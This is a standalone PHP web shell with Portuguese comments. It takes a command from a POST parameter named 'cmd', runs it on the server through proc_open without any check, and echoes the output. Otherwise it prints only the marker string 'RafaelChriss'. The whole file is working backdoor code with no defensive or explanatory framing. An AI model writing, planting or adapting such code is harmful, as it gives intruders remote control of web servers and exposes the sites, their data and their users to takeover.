<?php

if (isset($_POST["cmd"])) {
    $cmd = ($_POST["cmd"]); 

    function exec_command($command) {
        // Verifica se a função exec está disponível
        if (function_exists('exec')) {
            $descriptorspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("file", "error-output.txt", "a")
            ); 
            $cwd = "";
            $env = array('some_option' => 'aeiou');
            $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
            
            if (is_resource($process)) {
                echo stream_get_contents($pipes[1]); 
                fclose($pipes[1]);
                proc_close($process);
            }
        } else {
            echo "A função exec não está disponível.";
        }
    }

    exec_command($cmd); 
    exit;
} else { 
    echo "RafaelChriss";
}
?>
